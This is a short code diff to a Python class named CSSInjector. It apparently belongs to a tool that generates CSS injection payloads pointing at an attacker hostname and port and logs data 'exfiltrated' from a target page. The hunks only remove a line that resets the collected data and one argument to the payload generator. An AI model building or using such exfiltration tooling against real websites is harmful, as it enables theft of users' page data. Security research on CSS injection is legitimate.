@@ -55,7 +55,6 @@ class CSSInjector:
             "end_exfiltration",
             f"[{client.id}] - The {self.selector} exfiltrated from {self.identifier} is : {client.data}",
         )
-        client.data = ""
 
         return web.Response(
             text=f"ok",
@@ -74,7 +73,6 @@ class CSSInjector:
             text=injection.generate_payload(
                 hostname=self.hostname,
                 port=self.port,
-                data=client.data,
                 identifier=self.identifier,
                 selector=self.selector,
                 client=client,
